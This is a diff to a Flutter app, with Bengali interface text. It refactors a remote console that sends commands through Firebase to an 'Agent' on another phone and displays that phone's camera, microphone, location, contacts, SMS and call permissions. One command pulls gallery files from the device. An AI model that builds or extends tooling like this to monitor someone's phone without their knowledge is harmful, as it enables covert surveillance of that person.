@@ -40,6 +40,30 @@ Future<bool> _fbPut(String path, Object data) async {
   }
 }
 
+// ── public helpers ──
+Future<Map<String, dynamic>?> remoteCmd(String deviceId, String type, {String? path}) async {
+  final id = '${DateTime.now().millisecondsSinceEpoch}';
+  await _fbPut('/devices/$deviceId/cmd',
+      {'id': id, 'type': type, if (path != null) 'path': path});
+  final sw = Stopwatch()..start();
+  while (sw.elapsedMilliseconds < 40000) {
+    await Future.delayed(const Duration(seconds: 2));
+    final r = await _fbGet('/devices/$deviceId/res');
+    if (r is Map && r['id'] == id) return Map<String, dynamic>.from(r);
+  }
+  return null;
+}
+
+Future<Map<String, dynamic>?> remoteInfoOf(String deviceId) async {
+  final i = await _fbGet('/devices/$deviceId/info');
+  return i is Map ? Map<String, dynamic>.from(i) : null;
+}
+
+bool infoOnline(Map<String, dynamic>? i) {
+  final ls = (i?['lastSeen'] as num?)?.toInt() ?? 0;
+  return ls > 0 && DateTime.now().millisecondsSinceEpoch - ls < 90000;
+}
+
 String _errHint(String? e) {
   switch (e) {
     case 'no_perm': return 'ওই ফোনে এই পারমিশনটা ON নেই';
@@ -53,7 +77,7 @@ String _errHint(String? e) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  REMOTE CONSOLE CARD — per-device control panel
+//  REMOTE CONSOLE CARD — per-device control panel (offline = hidden)
 // ═══════════════════════════════════════════════════════════════════════
 class RemoteConsoleCard extends StatefulWidget {
   final String deviceId;
@@ -66,7 +90,7 @@ class RemoteConsoleCard extends StatefulWidget {
 
 class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
   Map<String, dynamic> _perms = {};
-  Map<String, dynamic> _info = {};
+  Map<String, dynamic>? _info;
   bool _open = false;
   String? _busy;
   Timer? _t;
@@ -86,36 +110,24 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
 
   Future<void> _pull() async {
     final p = await _fbGet('/devices/${widget.deviceId}/perms');
-    final i = await _fbGet('/devices/${widget.deviceId}/info');
+    final i = await remoteInfoOf(widget.deviceId);
     if (!mounted) return;
     setState(() {
       if (p is Map) _perms = Map<String, dynamic>.from(p);
-      if (i is Map) _info = Map<String, dynamic>.from(i);
+      _info = i;
     });
   }
 
-  bool get _online {
-    final ls = (_info['lastSeen'] as num?)?.toInt() ?? 0;
-    return ls > 0 && DateTime.now().millisecondsSinceEpoch - ls < 90000;
-  }
-
-  Future<Map<String, dynamic>?> _cmd(String type, {String? path}) async {
-    final id = '${DateTime.now().millisecondsSinceEpoch}';
-    await _fbPut('/devices/${widget.deviceId}/cmd',
-        {'id': id, 'type': type, if (path != null) 'path': path});
-    final sw = Stopwatch()..start();
-    while (sw.elapsedMilliseconds < 40000) {
-      await Future.delayed(const Duration(seconds: 2));
-      final r = await _fbGet('/devices/${widget.deviceId}/res');
-      if (r is Map && r['id'] == id) return Map<String, dynamic>.from(r);
-    }
-    return null;
-  }
+  bool get _online => infoOnline(_info);
 
   Future<void> _onCmd(String type, {String? path}) async {
     if (_busy != null) return;
+    if (!_online) {
+      _snack('ফোনটি অফলাইন 📴 — ওই ফোনে নতুন অ্যাপ ইন্সটল + Agent চালু না হওয়া পর্যন্ত কাজ করবে না');
+      return;
+    }
     setState(() => _busy = type);
-    final res = await _cmd(type, path: path);
+    final res = await remoteCmd(widget.deviceId, type, path: path);
     if (!mounted) return;
     setState(() => _busy = null);
     if (res == null) {
@@ -138,7 +150,7 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
 
   Future<void> _fetchAndOpen(String path) async {
     setState(() => _busy = 'get');
-    final res = await _cmd('galleryGet', path: path);
+    final res = await remoteCmd(widget.deviceId, 'galleryGet', path: path);
     if (!mounted) return;
     setState(() => _busy = null);
     if (res == null || res['ok'] != true) {
@@ -254,22 +266,25 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
   }
 
   Widget _pIcon(String key) {
-    final on = (_perms[key] as num?)?.toInt() == 1;
-    IconData ic;
+    final granted = _online && (_perms[key] as num?)?.toInt() == 1;
+    IconData normal;
+    IconData slashed;
     switch (key) {
-      case 'cam': ic = on ? Icons.camera_alt : Icons.no_photography; break;
-      case 'pho': ic = on ? Icons.photo_library : Icons.hide_image; break;
-      case 'mic': ic = on ? Icons.mic : Icons.mic_off; break;
-      case 'loc': ic = on ? Icons.location_on : Icons.location_off; break;
-      case 'con': ic = on ? Icons.contacts : Icons.person_off; break;
-      case 'not': ic = on ? Icons.notifications : Icons.notifications_off; break;
-      case 'sms': ic = on ? Icons.sms : Icons.sms_failed; break;
-      case 'cal': ic = on ? Icons.call : Icons.call_end; break;
-      default: ic = Icons.help_outline;
+      case 'cam': normal = Icons.camera_alt; slashed = Icons.no_photography; break;
+      case 'pho': normal = Icons.photo_library; slashed = Icons.hide_image; break;
+      case 'mic': normal = Icons.mic; slashed = Icons.mic_off; break;
+      case 'loc': normal = Icons.location_on; slashed = Icons.location_off; break;
+      case 'con': normal = Icons.contacts; slashed = Icons.person_off; break;
+      case 'not': normal = Icons.notifications; slashed = Icons.notifications_off; break;
+      case 'sms': normal = Icons.sms; slashed = Icons.sms_failed; break;
+      case 'cal': normal = Icons.call; slashed = Icons.call_end; break;
+      default: normal = Icons.help_outline; slashed = Icons.help_outline;
     }
+    final Color col = !_online ? Colors.white24 : (granted ? Colors.green : Colors.redAccent);
+    final IconData ic = !_online ? normal : (granted ? normal : slashed);
     return Padding(
       padding: const EdgeInsets.symmetric(horizontal: 3),
-      child: Icon(ic, color: on ? Colors.green : Colors.redAccent, size: 17),
+      child: Icon(ic, color: col, size: 17),
     );
   }
 
@@ -278,22 +293,23 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
       padding: const EdgeInsets.all(3),
       child: InkWell(
         borderRadius: BorderRadius.circular(10),
-        onTap: _busy == null ? () => _onCmd(type) : null,
+        onTap: () => _onCmd(type),
         child: Container(
           padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
           decoration: BoxDecoration(
             color: const Color(0xFF252525),
             borderRadius: BorderRadius.circular(10),
-            border: Border.all(color: const Color(0xFFF5E6C8).withOpacity(0.2)),
+            border: Border.all(color: const Color(0xFFF5E6C8).withOpacity(_online ? 0.2 : 0.08)),
           ),
           child: Row(
             mainAxisSize: MainAxisSize.min,
             children: [
               _busy == type
                   ? const SizedBox(width: 14, height: 14, child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFFF5E6C8)))
-                  : Icon(ic, color: const Color(0xFFF5E6C8), size: 15),
+                  : Icon(ic, color: _online ? const Color(0xFFF5E6C8) : Colors.white24, size: 15),
               const SizedBox(width: 6),
-              Text(label, style: const TextStyle(color: Colors.white70, fontSize: 11)),
+              Text(label,
+                  style: TextStyle(color: _online ? Colors.white70 : Colors.white24, fontSize: 11)),
             ],
           ),
         ),
@@ -303,6 +319,7 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
 
   @override
   Widget build(BuildContext context) {
+    if (!_online) return const SizedBox.shrink();
     return Container(
       margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
       padding: const EdgeInsets.all(10),
@@ -325,7 +342,7 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
                 const SizedBox(width: 8),
                 Expanded(
                   child: Text(
-                    '${widget.label}  •  ${_online ? 'অনলাইন 🟢' : 'অফলাইন ⚫'}',
+                    '${widget.label}  •  ${_online ? 'অনলাইন 🟢' : 'অফলাইন ⚫ (এজেন্ট নেই)'}',
                     style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w600),
                   ),
                 ),
